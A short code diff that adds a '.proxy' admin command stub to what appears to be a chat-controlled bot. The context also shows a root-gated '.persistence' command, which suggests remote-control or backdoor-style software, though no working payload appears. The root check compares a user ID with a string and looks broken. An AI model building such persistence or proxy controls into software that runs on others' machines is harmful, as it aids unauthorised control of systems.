@@ -710,6 +710,11 @@ def main(): # This is the main function for all of the bot controls.
                     target = message.split(' ', 1)[0]
                     nonExist(target, name)
                 
+                # Respond to '.proxy' command from admin.
+                if name.lower() == adminname.lower() and message.find('.proxy') != -1:
+                    target = message.split(' ', 1)[0]
+                    nonExist(target, name)
+                
                 # Respond to '.persistence' command from admin.
                 if name.lower() == adminname.lower() and message.find('.persistence') != -1:
                     if os.getuid() == 'root':
